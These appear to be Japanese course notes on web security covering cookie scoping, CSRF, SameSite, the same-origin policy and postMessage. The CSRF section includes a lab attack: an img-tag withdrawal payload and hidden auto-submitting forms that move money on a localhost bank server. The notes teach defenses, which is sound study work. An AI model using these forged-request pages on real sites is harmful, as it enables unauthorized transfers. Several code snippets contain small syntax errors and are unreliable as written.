# CookieのPathは安全に利用できるか？
* すべての場合に適用できるような解はない。そのため、Pathに頼るのは危険である。
* subdomainを使う。Cookieは同一ドメインもしくは、より特定されたドメインからアクセスすることが出来る。
* Pathで設定できる例
  * sample1.shibaura-it.ac.jp vs. sample2.shibaura-it.ac.jp
    * sample1とsample2で排他的であり、片方のcookieを設定しても、他方からアクセスできない。
  * sample1.shibaura-it.ac.jp vs. shibaura-it.ac.jp
    * 前者は、後者のcookieにアクセスできる。その逆は不可である。
  * acm.shibaura-it.ac.jp vs. login.shibaura-it.ac.jp
    * 排他的である。
  * hello.login.shibaura-it.ac.jp vs. login.shibaura-it.ac.jp
    * 前者は、後者のcookieにアクセスできる。その逆は不可である。
# cookieのPathを何に設定すべきか？
* `Path=/` と設定し、その設定を利用しないこと。  
    `Set-Cookie: key=vaule; Secure; HttpOnly: Path=/`
* なぜPathを省略するだけではだめなのか？
  * Cookieはどこからでも参照可能という前提で書く必要がある。　

# Ambient Authority による問題
  * Ambient Authorityは直訳すると「周囲の権限」という意味である。
    * ここでは、別のサイトでの権限という意味である。特にCookieが開発者が認証のために周囲の権限に依存することを奨励していることに伴う問題を指す。
    * 詳しくは[RFC6265](https://datatracker.ietf.org/doc/rfc6265/)の8.2 Ambient Authorityをみる。
* どのサイトがリクエストをしているかが不明になる
* もし、クライアントが`attacker.com`に次のHTMLを埋め込んだページを読み込んだら、どのようなリクエストをクライアントは行うか？  
  `<img src='https://bank.example.com/withdraw?from=bob&to=mallory&amount=1000'>`
  * このときクライアントは`attacker.com`を読み込んでいるが、`bank.example.com`に対するリクエストを送る。しかも、クライアントのcookieを使って、`bank.example.com`にbobからmalloryに1000を送金するように指示する。
# Cross-Site Request Forgery (CSRF)
* クライアント側のエンドユーザが意図に反してリクエストを送るよう仕向ける攻撃
  * クライアントが認証しているweb app等の情報を利用して、意図に反するリクエストを作成するようコードをつくる。
* 被害の例：
  * 一般的なWebサイトの利用者：CSRFによって、利用者が認証後の権限で送金操作やe-mailアドレスを変更をリクエストするよう動作をする。
    * 攻撃者はpathやqueryを事前に知っておく必要がある。
  * 管理者権限をもつWebサイトの利用者：CSRFによって、管理者が新たな管理者権限を持つ利用者を追加できる。または、サーバ上で管理者権限で命令を実行できる。
  * この攻撃は、攻撃者がHTTPレスポンスを読めなくても成立する。　
    * 攻撃者は  `<img src='https://bank.example.com/withdraw?from=bob&to=mallory&amount=1000'>`の結果の表示を必要としないということ。

# Demo CSRF
## 送金機能を実装
### 欲しい機能
* 送金先・送金額を指定する
* データベースを書き換える

### 実装例
* server5.js に実装する

* 送金先・送金額を指定する
  * formを使ってamount, toを指定する。
  * 指定したら`/transfer`にデータを送る。
  ```
  app.get('/', (req, res) => {
      ...
    if (username) {
        res.send(`
        Hi ${username}. Your balance is $${BALANCES[username]}.
        <form method='POST' action='/transfer'> // transferで送金処理を実施する
        Send amount:
        <input name='amount' /> //送金額を指定する
        To user:
        <input name='to' /> //送金先を指定する
        <input type='submit' value='Send' /> //送金ボタン
        </form>
        `)
    } else {
        ...
    }
  })
  ```
* データベースを書き換える
  * `/transfer` でデータベースを書き換えて送金処理を実施する
  * 書き換えたら、`/`に戻る
  ```
  app.post('/transfer', (req,res) =>{
    const sessionId = req.cookies.sessionId
    const username = SESSIONS[sessionId]
    
    // 有効なusernameが取得できなければFailし、終了する。
    if(!username){
        res.send('Fail!')
        return
    }
    // amountとtoを受け取る
    const amount = Number(req.body.amount)
    const to = req.body.to

    // BALANCESデータベースを書き換える
    BALANCES[username] -= amount
    BALANCES[to] += amount

    //処理が終わったら'/'に戻る
    res.redirect('/')
  })
  ```
  ## 攻撃側のウェブサイトを作る。
  * 攻撃シナリオ
    * 目的：利用者の意図に反して送金する
    * 銀行のウェブサイトにログインして有効なCookieを持つ利用者のsessionIdを利用する。
    * 送金用のフォームをiframeで埋め込む
  * 攻撃用ウェブサイトの準備
    * attacker.html : 標的が訪問するWebサイト
    * attacker-iframe.html: 不正な送金を行うコードを保持しておくサイト
    * これらは`http://localhost:9999/`にホストしておく。Node.jsのhttp-serverを使う。
      * インストール `npm install -g http-sever`
      * 起動 `http-server ./attacker/ -p 9999 -o`
  * attacker.html
  ```
  <!DOCTYPE html>
    <html lang='en'>
        <head>
            <meta charset="utf-8">
            <Title>My cool site</Title>
        </head>
        <body>
            <h1>Cool cat site</h1>
            <img src='cat.gif' />
            <iframe src="attacker-iframe.html" style='display: none'/>
            <!-- 元のウェブサイトから送金コードをコピーして、余計な文字を消す
                actionにlocalhost:4000を追記する
                style='display: none'属性を追記する
                ここから先をiframeで別のサイトに飛ばす 
            <form method='POST' action='http://localhost:4000/transfer'　style='display: none'>
                <input name='amount' value='100' />
                <input name='to' value='alice' />
                <input type='submit' value='Send' />
            </form>
            <script>
                document.forms[0].submit()
            </script>
            -->
        </body>
    </html>
  ```
  * attacker-iframe.html
    * 余計なものを除いて、自動的にsubmitするように作り替える。
  ```
  <form method='POST' action='http://localhost:4000/transfer' style='display: none'>
    <input name='amount' value='100' />
    <input name='to' value='alice' />
    <input type='submit' value='Send' />
  </form>
  <script>
      document.forms[0].submit()
  </script>
  ```

# CSRF 対策
  * 別のサイトから発生したリクエストに対して、"ambient authority"を取り除くことができるのか？

# SameSite Cookies
* SameSite 属性は、他のWebサイトから発生するCookieの動作を規定するものである。
* 属性の種類
  * SameSite=None
    * default Cookieの送信に制限なし
  * SameSite=Lax
    * 他のドメインへのリクエストに伴うCookieをセットしない。
    * top-level navigationで、且つ GET メソッドであれば、他のドメインへのリクエストであってもクッキーをセットする。
      * 画像など、そのWebサイトに属するものでGETならばセットできる。
      * POSTメソッドを使ったフォームやimgタグはCookieをセットしない。
      * 先の例の場合、ブラウザに表示されるURLが遷移するtop-level navigation は行われない。そのためSameSite=Laxの場合は、攻撃が実行できなくなる。
  * Google Chrome では バージョン 80 以降、SameSite 属性が宣言されていない Cookie は SameSite=Lax として扱われるようになった。
  * SameSite=Strict 
    * Cookieを設定したWebサイトだけがCookieを設定できる。
    * 最も厳しい設定である。
  * `Set-Cookie: key=value; Secure; HttpOnly; Path=/; SameSite=Lax` のように設定する。
# Cookieの有効期間
* 適切な期間を選択する必要がある。
  * 30 - 90 日
  * 例えば30日カウンターを設定して、アクティブな利用者がCookieを更新する方法もある。
## 30 days counter
```
//cookieの設定
res.cookie('sessionId', sessionId, {
  secure: true,
  httpOnly: true,
  sameSite: 'lax'
  maxAge: 30*24*60*60*1000 // 30日*24時間*60分*60秒*1000ms
  })

//cookieの削除
res.clearCookie('sessionId',{
  secure: true,
  httpOnly: true,
  sameSite: 'lax'
})
```
# CSRF 対策の実装
* server5.js
  * server5.js `/login`と`/logout`を書き換える。
  * res.cookieとres.clearCookieはsecure, httpOnlyを合わせておかないと、別のcookieだと認識されるので注意する。
  * localhost:4000とlocalhost:9999ではドメインを跨がないのでLaxでも
* 
  * cookieを発行するときに、secure, httpOnly, maxAgeを設定する。
  * secureは、httpsで実験しないのでコメントアウトする
* 
```
app.post('/login', (req, res)=>{
    const username = req.body.username
    const password = USERS[username]
    if (req.body.password === password){
        nextSessionId = randomBytes(16).toString('base64')
        res.cookie('sessionId',nextSessionId{
            //secure: true, // localhostで通信するのでhttpsが使えない。
            httpOnly: true,
            sameSite: 'lax',
            maxAge: 30 * 24 * 60 * 60 * 1000 // 30 days
        })
        SESSIONS[nextSessionId] = username
        res.redirect('/')
    } else {
        res.send('Fail!')
    }
})
```

```
app.get('/logout',(req, res)=>{
    const sessionId = req.cookies.sessionId
    res.clearCookie('sessionId', {
        //secure: true, // localhostで通信するのでhttpsが使えない。
        httpOnly: true,
        sameSite: 'lax'
    })
    delete SESSIONS[sessionId]
    res.redirect('/')
})
```
## 実験結果
動画の通り実験してみると、失敗する。すなわち、localhost:9999からlocalhost:4000にsessionIdを渡す操作が観測できる。  

解決策として、/etc/hostsに `127.0.0.1 attacker.com`を追記する。
すると、attaker.com と localhost の間でドメインをまたぐので`sessionId`をcookieで送らないことが確認できる。
* 実験結果を確かめると、`Sec-Fetch-Site: cross-site`となっている。
![image](/uploads/58875338efab517be62873b5be76e651/image.png)

# ここまでのまとめ
* Cookieはセッシをョン管理に利用できる
* クライアントが送信するデータは信用ならない！
* Ambient Authority は便利だが、リスクがある。
* Cookieを利用する場合は次のように設定すること
  * `Set-Cookie: key=values; Secure; HttpOnly; Path=/; SameSite=Lax; Expires=Fri, 1 Nov 2019 00:00:00 GMT`

# 何を許可すべきか？
* ウェブサイトAとウェブサイトBをリンクしてよいか
* ウェブサイトAをウェブサイトBに埋め込んでよいか
* ウェブサイトAをウェブサイトBに埋め込んで、コンテンツを操作できるようにしてよいか
  * これは明らかにまずい
* ウェブサイトAがウェブサイトBにformを送ってよいか？
  * 良いアイデアではないが、禁止されていない
* ウェブサイトAがウェブサイトBのimageを埋め込んで良いか？
  * 便利だが、linkにすべき。隔離するのがむずかしい。
  * CDNで使われている手法である。
* ウェブサイトAがウェブサイトBのスクリプトを埋め込んで良いか？
  * 公開されているものは良いだろう。
* ウェブサイトAがウェブサイトBのデータを読み取っても良いか？

# same origin policy
* 基本的なセキュリティモデル
* 異なるソースから複数のページを生成することは、干渉を避けるためにするべきでない。
## Same origin policyの実装例
* Same orign policy はプロトコル、ホスト名、及びポートのタプルを検証することで実現できる。
* 関数`isSameOrign` : (url1, url2) → {0,1}
```
function isSameOrgin (url1, url2){
  return url.protocol === url2.protocol &&
  url1.hostname === url2.hostname &&&
  url1.port === url2.port
}
```

## 何を許可すべきか
* セキュリティを確認するために必要な動作は何か
* ドキュメントのはじめから終わりをどう定義するか
* Originとはなにか？
  * RFCに書いてある
* 協調を前提としていないオリジン間のインタラクションはどうあるべきか？

# Demo: 
* ifarmeを使ってシラバスページの下に別のページを埋め込んだ
```
const iframe = document.createElement('iframe')
iframe.src = 'http://syllabus.sic.shibaura-it.ac.jp/syllabus/2022/sys/133026.html.ja'
document.body.append(iframe)
```
* `iframe.src`を書き換えてみる
  * これは通るか？ `iframe.src='https://syllabus.sic.shibaura-it.ac.jp/syllabus/2022/sys/132990.html.ja'` 
    * 通る、same origin policy と合致する。
  * これは通るか？ `iframe.src='https://example.com'` 
    * iframeで別サイトを埋め込むことは許可している
    * 別のページを埋め込むのは良い
* 別のページから `iframe.contentDocument.cookie` でcookieを表示してみる
  * `iframe.contentDocument` で要素の内容を取得できる。
  * frameまたはiframe要素で読み込まれているページが別ドメインである場合、クロスドメインの制約に引っかかって失敗する
    * `iframe.src = 'https://www.shibaura-it.ac.jp'` に変更して `iframe.contentDocument`で表示すると`null`
* `fetch()` で別ドメインのページを読み込もうとするとポリシー違反でエラーが出る。 
  * `const res = await fetch('https://example.com')` はCORSエラーとなる。
  * オリジン間リソース共有 (Cross-Origin Resource Sharing, CORS) とは、異なるオリジンにある選択されたリソースへのアクセス権を与えるようブラウザーに指示するための仕組み 
    * セキュリティ上の理由から、ブラウザーは、スクリプトによって開始されるオリジン間 HTTP リクエストを制限している。例えば、 XMLHttpRequestや Fetch API は同一オリジンポリシー (same-origin policy) に従う。
    * 参考：[mdn CROS](https://developer.mozilla.org/ja/docs/Web/HTTP/CORS)

# Same origin or not?
* https://example.com/a/ -> https://example.com/b/
  * Yes
* https://example.com/a/ -> https://www.example.com/b/
  * No! ホスト名が違う
* https://example.com/ -> http://example.com
  * No! プロトコルが違う。
* https://example.com/ ->  https://example.com:81/
  * No! ポート番号が違う。
* https://example.com/ -> https://example.com:80/
  * No! ポート番号が違う httpsは443

# 同一オリジンにまつわる問題
* 条件の厳しさ：syllabus.sic.shibaura-it.ac.jp と scombz.shibaura-it.ac.jpは異なるオリジンであるため、データを交換できない。
* 適用範囲の広さ：syllabus.sic.shibaura-it.ac.jp/syllabus/2022/sys132990.html.ja と syllabus.sic.shibaura-it.ac.jp/syllabus/2022/sys/133026.html.ja 完全に分離できない
* 特定のWebサイトの機能をポリシーで制限することはできない

# document.domain による問題解決の試み
## アイデア：2つの異なるオリジン間で通信するため、同一オリジンポリシーを回避する
* 2つの連携関係のあるサイトが、同一オリジンポリシーに沿って、通信をしたい。
  * これらのサイトが同一のTLD（top level domain)に属する
  * 例：syllabus.shibaura-it.ac.jp と scombz.shibaura-it.ac.jp に次のような属性を追加する。
    * `document.domain = 'shibaura-it.ac.jp'`
## 2つのオリジンがdocument.domain をそれぞれ設定する必要がある。
* opt-in （事前に設定）する方式で設定する
  * `attacker.shibaura-it.ac.jp`が `document.domain = 'shibaura-it.ac.jp'`を設定しても、shibaura-it.ac.jpが同じ設定をしないと、2つのサイト間では通信できない。
  * 攻撃者があらかじめ設定しているかどうかを調べれば良いのでは？
    * 外からはiframeの例で見たとおり、nullが返ってくるので調べることが出来ない。
* 一方で、これは危険な試みでもある。
  * `document.domain = 'shibaura-it.ac.jp'`の設定によって、shibaura-it.ac.jpに属しているどのコンピュータからもアクセスできる。
  * 攻撃者が、`attacker.shibaura-it.ac.jp`に`document.domain='shibaura-it.ac.jp'`を設定すれば同一オリジンとなり、他のサイトのデータを読み取れる

# 親ウィンドウからiframeの子ウィンドウにメッセージを送る
## アイデア：2つの異なるオリジン間で通信するため、同一オリジンポリシーを回避する
* 同一オリジンの問題は依然としてある。
* 親ウィンドウは子iframeを操作できる。
  * URLのフラグメント部分（https:../...#Fragment)に情報をエンコードして入れ込む
  * iframe.srcでURLに入れ込んだ情報を送る

* parent.html
  * parent.html に iframe で child.html をいれる。
  * ブラウザのセキュリティが強化されているので、そのままでは動かない。次のContent Security Policy を入れることで再現できる。 `<meta http-equiv="Content-Security-Policy" content="default-src 'self'; child-src http://localhost:4001; script-src 'unsafe-inline'">`
```
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset="utf-8" />
    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; child-src http://localhost:4001; script-src 'unsafe-inline'">
    <title>Parent</title>
</head>
<body>
    <h1>Parent: localhost:4000</h1>
    <input name='val' /> <!--キーボードからのインプットを受け付ける--> 
    <br />
    <br />
    <iframe src="http://localhost:4001/child.html"></iframe>
    <script>
        // inputとiframeを結びつけて、キーボード入力が行われたら、iframe.srcを指定する
        // inputの値をエンコードして、フラグメントに付ける
        // (input, iframe) -> iframe.src
        const input = document.querySelector('input') // querySelector で input 要素を取得
        const iframe = document.querySelector('iframe') // querySelector で iframe 要素を取得する
        input.addEventListener('input', () => {
            iframe.src = `http://localhost:4001/child.html#${encodeURIComponent(input.value)}`
        })
    </script>
</body>

</html>
```
* child.html
  * parent.htmlからwindow.locationでURLを返す。さらに、フラグメンテーション部分を取り出してdecodeする。
  * window.location: document の現在位置についての情報を持つ Location オブジェクトを返す。
```
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset="utf-8" />
    <title>Child</title>
</head>
<body>
    <h1>Child: localhost:4001</h1>
    <div></div>
    <script>
        const div = document.querySelector('div') // querySelectorでdiv要素を取得する
        // 100ms ごとにURIのフラグメントを取得してdivに入れる
        setInterval(() => {
            div.textContent = decodeURIComponent(window.location.hash).slice(1)
        }, 100)
    </script>
</body>

</html>
```

# postMessage APIを利用する
* 協調するオリジン間でセキュアなクロスオリジン通信を実現する
* 文字列と属性などのデータをクロスオリジンで送信できる
* 便利な特徴
  * "Structured clone" アルゴリズム

## DEMO： postMessage cross-orign communication
* parent.htmlとchild.htmlの間でpostMessageを使って通信する
  * URLのFragmentが変化しないことを確認する。
  * 100msの更新がなく、`addEventListener`を使うことで、キーボードのインプットに応じて更新できる
  * ハマったこと
    * サーバの起動は次のコマンドで行う。
     `% http-server ./parent-child/ -p 4000 & http-server ./parent-child/ -p 4001 -o`
    * https://localhost:4000/parent.html から実行しないと、うまくいかない。
      * 4000と4001にサーバが立つが、通信はparent.html(port 4000) -> child.html (port4001)でしか通信できない。
* parent.html
```
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset="utf-8" />
    <meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline'; child-src http://localhost:4001; script-src 'unsafe-inline';">
    <title>Parent</title>
</head>
<body>
    <h1>Parent: localhost:4000</h1>
    <input name='val' />
    <br />
    <br />
    <iframe src="http://localhost:4001/child.html"></iframe>
    <script>
        const input = document.querySelector('input')
        const iframe = document.querySelector('iframe')
        input.addEventListener('input', () => {
            iframe.contentWindow.postMessage(input.value, 'http://localhost:4001') // postMessageAPI
        })
    </script>
</body>

</html>
```
* child.html
```
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset="utf-8" />
    <meta http-equiv="Content-Security-Policy" : script-src 'unsafe-inline'">

    <title>Child</title>
</head>
<body>
    <h1>Child: localhost:4001</h1>
    <div></div>
    <script>
        const div = document.querySelector('div')
        // postMessage API で parentからのmessageを受け取って、div.textContent を書き換える
        window.addEventListener('message', event => {
            if (event.origin !== 'http://localhost:4000') return
            div.textContent = event.data
        })
    </script>
</body>
</html>
```
# 現実的な例
例えば、syllabus.shibaura-it.ac.jp が scombz.shibaura-it.ac.jp からログインしているユーザの氏名を取得するとする。
syllabus.shibaura-it.ac.jpに次のようなコードを追記する。

```
window.addEventListener('message', event =>{
  setCurentUser(event.data.name)
})
```
このときiframeにscombzを埋め込んで、postMessageで親ウィンドウにデータを渡す。
```
const data = {name: 'Dai Mochinaga'}
window.parent.postMessage(data, '*')
```
これは、マズイ例。なぜ？
* iframe にscombz.shibaura-it.ac.jpを埋め込んでpostMessageで名前を送るとき、syllabus.shibaura-it.ac.jp以外にもデータを出せる。
* メッセージの行き先を検証する仕組みが必要
  * もし攻撃者がscombz.shibaura-it.ac.jpを適当なサイト（例えばattacker.com）に埋め込んだときに、scombzにログインしている利用者の名前を取得することが出来る。
  * 解決策：scombz.shibaura-it.ac.jp が受け手となるオリジンを指定する
  ```
  const data = {name: 'Dai Mochianga'}
  window.parent.postMessage(data, 'https://syllabus.shibaura-it.ac.jp')
  ```
  ## attacker.comにsyllabus.shibaura-it.ac.jpを埋め込めば名前の取得は成功する？
  * 結論：しない
  * 埋め込みをattacker.com ⊃ syllabus.shibaura-it.ac.jp ⊃ login.shibaura-it.ac.jp
    * このときlogin -> syllabusへのメッセージはリクエストがattacker.comから来ているので失敗する機能を実装できる
  * messageのsourceを検証する
    * 攻撃者がsyllabus.shibaura-it.ac.jpをiframeでattacker.comに埋め込んだとしても、syllabus.shibaura-it.ac.jpがmessageのsourceを検証できる仕組みを入れる。
    ```
    window.addEventListener('message', event =>{
      if (event.origin !== 'https://scombz.shibaura-it.ac.jp') return
      setCurrentUser(event.data.name)
    })
    ```
# postMessageのintegrity (完全性)を確保するための対策
* 送信側：メッセージを受け取れるオリジンを設定する
  * ウィンドウのURLが変わった場合に備える
* 受信側：送信側の認証情報を確認する
  * 意図しないウィンドウがメッセージを送ってくる場合に備える
* 常に受取側や送信側を特定できるようにすることが重要である。

# 同一オリジンポリシーの例外
* 明示的にopt-out する仕組みがある。例えば, document.domain, fragment identifier communication, postMessage APIといった例がある。
* 自動的な例外もある
  * これらを認識する必要がある
  * 多くのセキュリティ課題の源泉である
## 問：example.com からのリクエストの内、許可されるものはどれか
```
<!doctype html>
<html lang='en'>
  <head>
    <meta charset='utf-8' />
    <link rel='stylesheet' href='https://other1.com/style.css' />
  </head>
  <body>
    <img src='https://other2.com/image.png' />
    <script src='https://other3.com/script.js'></script>
  </body>
</html>
```
* 答え：すべて許可される
  * other1.com のstyle.cssを参照すること
  * other2.com のimage.pngを読み込むこと
  * other3.com のscript.jsを実行すること
* 他のオリジンにある静的なリソースは読み込むことができる。
  * 画像（他の画像サイトにある画像）
  * スクリプト (e.g. FacebookのLikeボタン、広告、トラッキングスクリプト)
  * スタイル (e.g. Google Fonts)
* なぜこのような仕様になっているのか？
  * ブラウザの実装？

## 同一オリジンポリシーの例外とambient authority
* Ambient Authorityはcookieで実装している
* attacker.comはtarget.comから本物のavatarを埋め込むことが出来る
  ```
  <h1>Welcome to your account!</h1>
  <img src='https://target.com/avater.png />
  ```
  * 対応策1：SameSite cookies
    * SameSite cookiesでattakcer.comとtarget.comの間の通信を規制する。
  * 対応策2: Referer ヘッダー
    * HTTP ヘッダーの refererを確認することで、どのWebサイトがアバターを要求しているか確認できる。
    * allowlistにないオリジンからの要求を拒否することが出来る
    * HTTPキャッシュに注意する